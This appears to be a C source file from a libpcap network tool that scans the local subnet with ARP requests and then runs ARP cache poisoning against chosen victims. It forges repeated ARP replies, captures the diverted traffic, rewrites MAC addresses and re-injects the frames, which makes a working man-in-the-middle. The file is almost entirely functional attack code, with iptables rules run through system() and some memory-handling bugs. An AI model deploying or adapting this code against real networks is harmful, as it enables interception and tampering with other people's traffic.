#include <ettin_pcap.h>
#include <main.h>
#include <string.h>

unsigned char arp_structure_raw[] = {
  0xff,0xff,0xff,0xff,0xff,0xff,// broadcast  0
  0xff,0xff,0xff,0xff,0xff,0xff,// local mac  6
  0x08,0x06,                    // ARP       12
  0x00,0x01,                    // ether     14
  0x08,0x00,                    // ipv4      16
  0x6,                          // hsz       18
  0x4,                          // psz       19
  00,0x1,                       // rqst      20
  0xff,0xff,0xff,0xff,0xff,0xff,// sender mac 22
  0x0 ,0x0 ,0x0 ,0x0 ,          // sender ip  28
  0xff,0xff,0xff,0xff,0xff,0xff,// target mac32
  0x1 ,0x2 ,0x3 ,0x4            // target ip 38
};

#define ARP_OFF_TARGMAC0    0
#define ARP_OFF_LOCALMAC1   6
#define ARP_OFF_PKTYPE     12
#define ARP_OFF_IPTYPE     16
#define ARP_OFF_OPCODE     20
#define ARP_OFF_SENDERMAC2 22
#define ARP_OFF_SENDERIP   28
#define ARP_OFF_TARGMAC    32
#define ARP_OFF_TARGIP     38

unsigned char * arp_raw = NULL;
struct bpf_program * fp_thread;
struct timeval started;
pthread_t cap_thread;
pthread_t poisoncap_thread;
pthread_t poisoninject_thread;
pthread_t timeout_thread;
pthread_t poison_thread;



struct argpoison {
  int num_victims;
  IP4_arp_state_t ** victims_ip_list;

} argpoison;

void poisonning_callback(u_char *user,const struct pcap_pkthdr* pkthdr,const u_char* packet)
{
  int i;
  // uint32_t sz;

  if(global_params.progfilters_cnt > 0){
    write(global_params.filter_chain_IO_fds[0],&pkthdr->len,4);
    write(global_params.filter_chain_IO_fds[0],packet,pkthdr->len);

  }
  if(global_params.global_verbosity){
    printf("captured len %d \n",pkthdr->len);
    printf("CB:%d\n",pkthdr->len);
    for(i=0;i<pkthdr->len;i++){
      printf("%02hhx ",*(packet+i));
    }
    printf("\n");
  }
  fflush(NULL);
}


volatile int bkhelp=0;

void * poisonning_filter_reinject(void* argptr){

  int msgsz;
  char * pkt;
  int i;
  IP4_arp_state_t ** victims_ip_list = ((struct argpoison*)argptr)->victims_ip_list;
  
  int num_victims = ((struct argpoison*)argptr)->num_victims;
  while(global_params.poisonning){
    if(global_params.progfilters_cnt > 0){
      read(global_params.filter_chain_IO_fds[1],&msgsz,4);
      pkt = (char*)calloc(msgsz,sizeof(char));
      read(global_params.filter_chain_IO_fds[1],pkt,msgsz);
      //printf("v: %d will reinject : %d \n",num_victims,msgsz);
      // fix the target mac
      i=0;
      //   while(i<num_victims){
	bkhelp++;


	

	if(   memcmp(victims_ip_list[0]->mac_addr,pkt+6,6) == 0   ) //destmac
	  {
	    //	printf("fixing mac d1\n");
	    memcpy(pkt,victims_ip_list[1]->mac_addr,6); // patch pkt
	    
	    
	  }
	else
	  {
	    //  	printf("fixing mac d2\n");
	    memcpy(pkt,victims_ip_list[0]->mac_addr,6); // patch pkt	 
	  }
	memcpy(pkt+6,&pcap_device_infos.localmac,6); // patch pkt

	
	//	i++;
	//}
      
      // inject
      if(pcap_inject(pcap_device_infos.handle,pkt,msgsz) < msgsz)
	{
	  pcap_perror(pcap_device_infos.handle,"INJECTING: FILTERED");
	}else{
        //	fprintf(stderr,"injected: %d\n",msgsz);
        ;
      }
    
      free(pkt);
    }
  }
  return NULL;  
}

void * start_asyncpoisoncap(void * argptr)
{
  fp_thread =(struct bpf_program *)malloc(sizeof(struct bpf_program));
  char * arp_filter ;
  char * iptable_cmd;
  asprintf(&arp_filter,
	   "ether dst %s and %s",pcap_device_infos.localmac_string
           , global_params.pcapfilter);
    printf("poison filter : %s\n",arp_filter);
  int i=0;
  while(i<global_params.port_cnt){
    asprintf(&iptable_cmd,
	     "/sbin/iptables -i %s -A INPUT -p tcp --destination-port %d -j DROP",
             global_params.device,
             global_params.portlist[i]);
    printf("%s\n",iptable_cmd);
    system(iptable_cmd);
    i++;
    free(iptable_cmd);
  }

  if(pcap_compile(pcap_device_infos.handle,fp_thread,arp_filter,0,ntohl(pcap_device_infos.mask_raw_v4))<0){
    ETTIN_PERROR(-1, "filter compile failed: %s\n",pcap_geterr(pcap_device_infos.handle));
    exit(0);
  } else {
    ETTIN_PERROR(2, "filter compile success: %s\n",arp_filter);
    pcap_setfilter(pcap_device_infos.handle,fp_thread);
  }
 printf("grat oop err %s\n",pcap_geterr(pcap_device_infos.handle));
  free(arp_filter);
  gettimeofday(&started,NULL);

  // pcap_loop(pcap_device_infos.handle, -1, arping_callback, NULL);
  int ret =pcap_loop(pcap_device_infos.handle, -1, poisonning_callback, NULL);
    if(ret < 0 ){
      printf("loop err %d %s\n",ret,pcap_geterr(pcap_device_infos.handle));
    }else{
      printf("whut ?? %d %s\n",ret,pcap_geterr(pcap_device_infos.handle));
    }
  printf("loop out");

  return NULL;
}


void * poison(void * argptr){
  IP4_arp_state_t * curr_ip_list = IP4_arp_state_head;
  IP4_arp_state_t ** victims_ip_list = ((struct argpoison*)argptr)->victims_ip_list;
  int num_victims= ((struct argpoison*)argptr)->num_victims;
  int i=0,j=0;
  int crc;
  unsigned char * buffer = (unsigned char*)calloc(sizeof(arp_structure_raw)<64?64:sizeof(arp_structure_raw),sizeof(char));
  memcpy(buffer,arp_structure_raw,sizeof(arp_structure_raw));

  memcpy(buffer,arp_structure_raw,sizeof(arp_structure_raw));
  memcpy(buffer+ARP_OFF_LOCALMAC1,&pcap_device_infos.localmac,6);
  memcpy(buffer+ARP_OFF_SENDERMAC2,&pcap_device_infos.localmac,6);
  * (short*) (buffer+ARP_OFF_OPCODE) = htons(0x2);

  while(global_params.poisonning){
    // printf(RED"ARP SPIT\n"RESET);
    for(i=0;i<num_victims;i++){
      memcpy(buffer+ARP_OFF_TARGMAC0,&victims_ip_list[i]->mac_addr,6);
      memcpy(buffer+ARP_OFF_TARGMAC ,&victims_ip_list[i]->mac_addr,6);
      memcpy(buffer+ARP_OFF_TARGIP ,&victims_ip_list[i]->ip4_n,4);
      for(j=0;j<num_victims;j++){
	if(j!=i){
	  memcpy(buffer+ARP_OFF_SENDERIP,&victims_ip_list[j]->ip4_n,4);
	  crc = crc32(0, Z_NULL, 0);
	  crc = crc32(crc, (const unsigned char *)buffer, 60);
	  memcpy(buffer+60,&crc,sizeof(unsigned long));
	  //   printf("telling %s that %s is at my arp\n",victims_ip_list[j]->ip4_string,victims_ip_list[i]->ip4_string);
	  if(pcap_inject(pcap_device_infos.handle,buffer,sizeof(arp_structure_raw)<64?64:sizeof(arp_structure_raw)) < 64)
	    {
	      pcap_perror(pcap_device_infos.handle,"INJECTING: POISON");
	    }
	}
      }
    }
    usleep(global_params.timeout_millis*1000);
  }
  return NULL;
}


void start_poison(){
  //  printf("S P\n");
  int num_victims=0;
  int i=0;
  IP4_arp_state_t * curr_ip_list = IP4_arp_state_head;
  IP4_arp_state_t ** victims_ip_list;

  while(curr_ip_list!=NULL){
    if(curr_ip_list->is_target)
      num_victims++;
    curr_ip_list=curr_ip_list->next;
  }
  printf("P %d\n",num_victims);

  victims_ip_list = (IP4_arp_state_t**)calloc(num_victims,sizeof(IP4_arp_state_t*));
  curr_ip_list = IP4_arp_state_head;
  i=0;
  while(curr_ip_list!=NULL){
    if(curr_ip_list->is_target){
      victims_ip_list[i] = curr_ip_list;
      printf(GREEN"%s"RESET" is a poisoning target\n", victims_ip_list[i]->ip4_string);
      i++;
    }
    curr_ip_list=curr_ip_list->next;
  }

  argpoison.num_victims = num_victims;
  argpoison.victims_ip_list=victims_ip_list;
  
  global_params.poisonning=1;
  if(pthread_create(&poison_thread, NULL, poison, &argpoison)) {
    fprintf(stderr, "Error creating poison thread\n");
    fflush(NULL);
    exit(0);
  }
  if(pthread_create(&poisoncap_thread, NULL, start_asyncpoisoncap, NULL)) {
    fprintf(stderr, "Error creating poison_capping thread\n");
    fflush(NULL);
    exit(0);
  }
  if(global_params.progfilters_cnt > 0){
    if(pthread_create(&poisoninject_thread, NULL, poisonning_filter_reinject,&argpoison)) {
      fprintf(stderr, "Error creating poison_reinject thread\n");
      fflush(NULL);
      exit(0);
     }
  }
  sleep(5);
}

void stop_poison(){
  global_params.poisonning=0;
  pcap_breakloop(pcap_device_infos.handle);
  if(pthread_join(poison_thread, NULL)) {
    fprintf(stderr, "Error joining poison timeout thread\n");
  }else{
    ETTIN_PERROR(2,"Joined thread poison timeout\n");
  }
  if(pthread_join(poisoncap_thread, NULL)) {
    fprintf(stderr, "Error joining poison capture thread\n");
  }else{
    ETTIN_PERROR(2,"Joined thread poison capture\n");
  }
  fflush(NULL);
}

void print_ip_list()
{
  IP4_arp_state_t * curr_ip_list = IP4_arp_state_head;
  char * ippbuff = (char*) calloc (INET6_ADDRSTRLEN,sizeof(char));
  while(curr_ip_list != NULL){
    memset(ippbuff,0,INET6_ADDRSTRLEN);
    inet_ntop(AF_INET,&curr_ip_list->ip4_n,ippbuff,INET6_ADDRSTRLEN);
    printf("%s\t%14p %14p %14p\n",ippbuff,curr_ip_list,curr_ip_list->prev,curr_ip_list->next);
    curr_ip_list=curr_ip_list->next;

  }
  free(ippbuff);
}






void free_ip_list()
{
  IP4_arp_state_t * curr_ip_list = IP4_arp_state_head;
  IP4_arp_state_t * last = NULL;

  while(curr_ip_list->next != NULL){
    last = curr_ip_list->next;
    free(curr_ip_list->mac_addr_string);
    free(curr_ip_list->ip4_string);
    free(curr_ip_list->tv_sent);
    free(curr_ip_list);
    curr_ip_list = last ;
  }
  free(curr_ip_list->mac_addr_string);
  free(curr_ip_list->tv_sent);
  free(curr_ip_list);
  free(curr_ip_list->ip4_string);
  free(IP4_arp_state_head);
}




void arping_callback(u_char *user,const struct pcap_pkthdr* pkthdr,const u_char* packet)
{
  int i;
  IP4_arp_state_t * curr_ip_list = IP4_arp_state_head;
  int tmp;

  char * ippbuff = (char*) calloc (INET6_ADDRSTRLEN,sizeof(char));
  if(global_params.global_verbosity>3){
    printf("CB:%d\n",pkthdr->len);
    for(i=0;i<pkthdr->len;i++){
      printf("%02hhx",*(packet+i));
      if(i==5 || i== 11 || i== 13 || i== 15 || i== 17 ||i== 18 || i== 19 || i==20 || i== 26 || i==30 || i==36 || i==40)
	putchar('\n');
    }
  }
  //    printf("0x%04x 0x%04x 0x%04x\n",*((short*)(packet+ARP_OFF_PKTYPE)),*((short*)(packet+ARP_OFF_IPTYPE)),*((short*)(packet+ARP_OFF_OPCODE)));
  if(   *((short*)(packet+ARP_OFF_PKTYPE)) == 0x0608 &&
	*((short*)(packet+ARP_OFF_IPTYPE)) == 0x0008 &&
	*((short*)(packet+ARP_OFF_OPCODE)) == 0x0200
	){
    tmp = *((int*)(packet+ARP_OFF_SENDERIP));
    memset(ippbuff,0,INET6_ADDRSTRLEN);
    inet_ntop(AF_INET,((int*)(packet+ARP_OFF_SENDERIP)),ippbuff,INET6_ADDRSTRLEN);

    while(curr_ip_list->ip4_n != tmp)
      curr_ip_list=curr_ip_list->next;
    curr_ip_list->ip4_h = htonl(tmp);
    curr_ip_list->ip4_n = tmp;
    curr_ip_list->arp_received=1;
    for(i=0;i<6;i++){
      curr_ip_list->mac_addr[i] = *(packet+ARP_OFF_SENDERMAC2+i);
    }
    curr_ip_list->mac_addr_string = (char*) calloc(18,sizeof(char));
    sprintf(curr_ip_list->mac_addr_string,"%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
	    curr_ip_list->mac_addr[0],curr_ip_list->mac_addr[1],curr_ip_list->mac_addr[2],
	    curr_ip_list->mac_addr[3],curr_ip_list->mac_addr[4],curr_ip_list->mac_addr[5]);
    printf(RED"ARP: %-15s "RESET"%s\n",ippbuff,curr_ip_list->mac_addr_string);

  }
  fflush(NULL);
  free(ippbuff);

}




void * timeout_asynccap(void * argptr){
  struct timeval now;

  //  usleep(4*1000000);

  usleep(255*50000);
  gettimeofday(&now,NULL);
  printf("%fs\n", ((now.tv_sec * 1000000 + now.tv_usec) - (started.tv_sec * 1000000 + started.tv_usec)) /1000000.0);
  pcap_breakloop(pcap_device_infos.handle);
  //pthread_kill(cap_thread, SIGUSR1);
  pthread_cancel(cap_thread);

  if(pthread_join(cap_thread, NULL)) {
    fprintf(stderr, "Error joining capture thread\n");
  }else{
    ETTIN_PERROR(2,"Joined thread capture\n");
  }
  int r;
  /// clean the pcap break flag
  do{
    r = pcap_loop(pcap_device_infos.handle, -1, arping_callback, NULL);
    //  printf("r1  %d\n", r);
  }
  while(r!=-2);

  // pthread_kill(cap_thread,SIGHUP);
  gettimeofday(&started,NULL);
  pcap_setfilter(pcap_device_infos.handle,pcap_device_infos.fp);
  pcap_freecode(fp_thread);
  free(fp_thread);
  //    printf("timeou cap\n");
  return NULL;
}

void * start_asynccap(void * argptr)
{
  fp_thread =(struct bpf_program *)malloc(sizeof(struct bpf_program));
  char * arp_filter ;
  asprintf(&arp_filter,"ether dst %s and arp",pcap_device_infos.localmac_string);

  //  printf("%s\n",arp_filter);

  if(pcap_compile(pcap_device_infos.handle,fp_thread,arp_filter,0,ntohl(pcap_device_infos.mask_raw_v4))<0){
    ETTIN_PERROR(0, "filter compile failed: %s\n",pcap_geterr(pcap_device_infos.handle));
    exit(0);
  } else {
    ETTIN_PERROR(2, "filter compile success: %s\n",arp_filter        );
    pcap_setfilter(pcap_device_infos.handle,fp_thread);
  }

  free(arp_filter);
  gettimeofday(&started,NULL);
  int r=0;
  do{
    r = pcap_loop(pcap_device_infos.handle, -1, arping_callback, NULL);
    printf("r1  %d\n", r);
  }
  while(r!=-2);


  return NULL;
}


void arping()
{
  IP4_arp_state_t * curr_ip_list = IP4_arp_state_head;
  unsigned char * buffer = (unsigned char*)calloc(sizeof(arp_structure_raw)<64?64:sizeof(arp_structure_raw),sizeof(char));
  memcpy(buffer,arp_structure_raw,sizeof(arp_structure_raw));
  int crc;
  FILE * fp;
  size_t len,read;
  char * line = NULL;
  char * scan_ip = (char*) calloc (15,sizeof(char));
  char * scan_arp = (char*) calloc (17,sizeof(char));
  int junk;
  //  char * ippbuff = (char*) calloc (INET6_ADDRSTRLEN,sizeof(char));
  memcpy(buffer+ARP_OFF_LOCALMAC1,&pcap_device_infos.localmac,6);
  memcpy(buffer+ARP_OFF_SENDERMAC2,&pcap_device_infos.localmac,6);
  memcpy(buffer+ARP_OFF_SENDERIP,&pcap_device_infos.ip_raw_v4,6);
  if(pthread_create(&cap_thread, NULL, start_asynccap, NULL)) {
    fprintf(stderr, "Error creating capture thread\n");
    exit(0);
  }
  if(pthread_create(&timeout_thread, NULL,timeout_asynccap , NULL)) {
    fprintf(stderr, "Error creating timeout thread\n");
    exit(0);
  }

  // getting local tables known device in unicast

  fp= fopen("/proc/net/arp","r");
  while ((read = getline(&line, &len, fp)) != -1) {
    //printf("Retrieved line of length %zu :\n", read);

    if(strstr(line,global_params.device)!=NULL){
      *(line+strlen(line)-1)=0;
      sscanf(line,"%s 0x%d 0x%d %s", scan_ip,&junk,&junk,scan_arp);
      // printf("%s: %s ; %s\n",line,scan_ip,scan_arp);
      curr_ip_list = IP4_arp_state_head;
      while( strcmp(curr_ip_list->ip4_string,scan_ip) !=0 ){
	curr_ip_list = curr_ip_list->next;
      }
      sscanf(scan_arp,"%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
	     &curr_ip_list->mac_addr[0],&curr_ip_list->mac_addr[1],&curr_ip_list->mac_addr[2],
	     &curr_ip_list->mac_addr[3],&curr_ip_list->mac_addr[4],&curr_ip_list->mac_addr[5]);
      // unicast arp-ping
      memcpy(buffer+ARP_OFF_TARGMAC0,&curr_ip_list->mac_addr,6);
      memcpy(buffer+ARP_OFF_TARGMAC,&curr_ip_list->mac_addr,6);
      memcpy(buffer+ARP_OFF_TARGIP   ,&curr_ip_list->ip4_n,4);
      crc = crc32(0, Z_NULL, 0);
      crc = crc32(crc, (const unsigned char *)buffer, 60);
      memcpy(buffer+60,&crc,sizeof(unsigned long));
      curr_ip_list->tv_sent=(struct timeval*)calloc(1,sizeof(struct timeval));
      if(pcap_inject(pcap_device_infos.handle,buffer,sizeof(arp_structure_raw)<64?64:sizeof(arp_structure_raw)) < 64)
	{
	  pcap_perror(pcap_device_infos.handle,"INJECTING: UNI-ARP-PING");
	}
      usleep(5000);
    }
  }

  // usleep(500);
  free(scan_ip);
  free(scan_arp);
  memcpy(buffer,arp_structure_raw,sizeof(arp_structure_raw));
  memcpy(buffer+ARP_OFF_LOCALMAC1,&pcap_device_infos.localmac,6);
  memcpy(buffer+ARP_OFF_SENDERMAC2,&pcap_device_infos.localmac,6);
  memcpy(buffer+ARP_OFF_SENDERIP,&pcap_device_infos.ip_raw_v4,6);
  curr_ip_list = IP4_arp_state_head;
  // broadcast flood
  while(curr_ip_list != NULL){
    //memset(ippbuff,0,INET6_ADDRSTRLEN);
    //inet_ntop(AF_INET,&curr_ip_list->ip4_n,ippbuff,INET6_ADDRSTRLEN);
    //	printf("%s\n",ippbuff);
    memcpy(buffer+ARP_OFF_TARGIP   ,&curr_ip_list->ip4_n,4);
    crc = crc32(0, Z_NULL, 0);
    crc = crc32(crc, (const unsigned char *)buffer, 60);
    memcpy(buffer+60,&crc,sizeof(unsigned long));
    curr_ip_list->tv_sent=(struct timeval*)calloc(1,sizeof(struct timeval));
    if(pcap_inject(pcap_device_infos.handle,buffer,sizeof(arp_structure_raw)<64?64:sizeof(arp_structure_raw)) < 64)
      {
	pcap_perror(pcap_device_infos.handle,"INJECTING: BRD-ARP-PING");
      }
    /*	for(i=0;i<(sizeof(arp_structure_raw)<64?64:sizeof(arp_structure_raw));i++){
	printf("0x%02x ",*(buffer+i));
	if(i==5 || i== 11 || i== 13 || i== 15 || i== 17 ||i== 18 || i== 19 || i==20 || i== 26 || i==30 || i==36 || i==40)
	putchar('\n');

	}
	putchar('\n');*/

    usleep(50000);
    curr_ip_list=curr_ip_list->next;
  }


  //	putchar('\n');
  if(pthread_join(timeout_thread, NULL)) {
    fprintf(stderr, "Error joining timeout thread\n");
  }else{
    ETTIN_PERROR(2,"Joined thread timeout\n");
  }

  fflush(NULL);


  free(buffer);
}


void rand_ip_list()
{
  IP4_arp_state_t * curr_ip_list = IP4_arp_state_head;
  IP4_arp_state_t * targ_ip_list, * tmp_ip_list;
  tmp_ip_list = (IP4_arp_state_t*) calloc(1,sizeof(IP4_arp_state_t));
  int qt,j,k,i=0;
  while(curr_ip_list != NULL){
    i++;
    curr_ip_list=curr_ip_list->next;
  }
  ETTIN_PERROR(2," Randomizing ip list\n");

  //   printf("%d\n",i);
  curr_ip_list = IP4_arp_state_head;
  qt=j=i;
  srand(time(NULL));
  while(j){
    targ_ip_list = IP4_arp_state_head;
    k=j;
    curr_ip_list = IP4_arp_state_head;
    while(  (qt - k++) >0 )
      curr_ip_list=curr_ip_list->next;
    do{
      i = rand()%qt;
    } while(i==j);

    k=i;

    while(i--)
      targ_ip_list =targ_ip_list->next ;

    if( targ_ip_list->next == curr_ip_list || targ_ip_list->prev == curr_ip_list )
      targ_ip_list =targ_ip_list->next ;

    //	printf("PRE  %d %d\t%14p %14p %14p\t%14p %14p %14p\n",j,k,curr_ip_list,curr_ip_list->prev,curr_ip_list->next,targ_ip_list,targ_ip_list->prev,targ_ip_list->next );


    if(targ_ip_list->prev == NULL)
      IP4_arp_state_head=curr_ip_list;

    if(curr_ip_list->prev == NULL)
      IP4_arp_state_head=targ_ip_list;


    tmp_ip_list->next = targ_ip_list->next;
    tmp_ip_list->prev = targ_ip_list->prev;

    if(curr_ip_list->prev!=NULL)
      curr_ip_list->prev->next = targ_ip_list;
    if(curr_ip_list->next!=NULL)
      curr_ip_list->next->prev = targ_ip_list;

    if(targ_ip_list->prev!=NULL)
      targ_ip_list->prev->next = curr_ip_list;
    if(targ_ip_list->next!=NULL)
      targ_ip_list->next->prev = curr_ip_list;

    targ_ip_list->next = curr_ip_list->next;
    targ_ip_list->prev = curr_ip_list->prev;

    curr_ip_list->next = tmp_ip_list->next;
    curr_ip_list->prev = tmp_ip_list->prev;

    //	printf("POST %d %d\t%14p %14p %14p\t%14p %14p %14p\n\n",j,qt,curr_ip_list,curr_ip_list->prev,curr_ip_list->next,targ_ip_list,targ_ip_list->prev,targ_ip_list->next );
	


    j--;
  }
  free(tmp_ip_list);
}


void make_ip_list() {
  char * ippbuff = (char*) calloc (INET6_ADDRSTRLEN,sizeof(char));
  IP4_arp_state_head = (IP4_arp_state_t*) calloc(1,sizeof(IP4_arp_state_t));

  uint32_t ip =  pcap_device_infos.ip_raw_v4;
  uint32_t msk = pcap_device_infos.mask_raw_v4;
  uint32_t brd = pcap_device_infos.broad_raw_v4;
  uint32_t net = ip & msk;
  inet_ntop(AF_INET,&net,ippbuff,INET6_ADDRSTRLEN);
  int i=0;
  uint32_t start = ntohl(net)+1;
  uint32_t stop = ntohl(brd);
  uint32_t curr;
  uint32_t start_n = htonl(start);
  uint32_t stop_n = htonl(stop);
  uint32_t curr_n;

  IP4_arp_state_t * curr_ip_list = IP4_arp_state_head;
  curr_ip_list->ip4_n = ip;
  curr_ip_list->ip4_h = ntohl(ip);
  curr_ip_list->ip4_string = (char*) calloc (16,sizeof(char));
  inet_ntop(AF_INET,&curr_ip_list->ip4_n,curr_ip_list->ip4_string,16);

  // printf("mk:%s\n",curr_ip_list->ip4_string);

  curr_ip_list->prev = NULL;
  curr_ip_list->mac_addr_string = (char*)calloc(strlen(pcap_device_infos.localmac_string),sizeof(char));
  strcpy(curr_ip_list->mac_addr_string,pcap_device_infos.localmac_string);
  memcpy(curr_ip_list->mac_addr,pcap_device_infos.localmac,6*sizeof(char));

  // printf("net %d %08x %s\n",net,net,ippbuff);

  memset(ippbuff,0,INET6_ADDRSTRLEN);
  inet_ntop(AF_INET,&start_n,ippbuff,INET6_ADDRSTRLEN);

  // printf("str %d %08x %s\n",start_n,start_n,ippbuff);

  memset(ippbuff,0,INET6_ADDRSTRLEN);
  inet_ntop(AF_INET,&stop_n,ippbuff,INET6_ADDRSTRLEN);


  // printf("stp %d %08x %s\n",stop_n,stop_n,ippbuff);

  while( (start+i) <stop){
    curr  = start+i;
    curr_n = htonl(curr);
    if(curr_n != ip){
      memset(ippbuff,0,INET6_ADDRSTRLEN);
      inet_ntop(AF_INET,&curr_n,ippbuff,INET6_ADDRSTRLEN);
      //    printf(" c: %d %08x %s\n",curr_n,curr_n,ippbuff);
      curr_ip_list->next = (IP4_arp_state_t*) calloc(1,sizeof(IP4_arp_state_t));
      curr_ip_list->next->prev = curr_ip_list;
      curr_ip_list=curr_ip_list->next;
      curr_ip_list->ip4_n = curr_n;
      curr_ip_list->ip4_h = curr;
      curr_ip_list->ip4_string = (char*) calloc (16,sizeof(char));
      inet_ntop(AF_INET,&curr_ip_list->ip4_n,curr_ip_list->ip4_string,16);
      //  printf("mk:%s\n",curr_ip_list->ip4_string);
    }
    i++;
  }

  //  print_ip_list();

  rand_ip_list();

  curr_ip_list = IP4_arp_state_head;
  /*   i=0;

       while(curr_ip_list != NULL ){
       i++;

       memset(ippbuff,0,INET6_ADDRSTRLEN);
       inet_ntop(AF_INET,&curr_ip_list->ip4_n,ippbuff,INET6_ADDRSTRLEN);
       printf("%s\t%14p %14p %14p\n",ippbuff, curr_ip_list, curr_ip_list->prev,curr_ip_list->next);
       curr_ip_list=curr_ip_list->next;
       }
       printf("%d\n",i);
  */
  free(ippbuff);

}
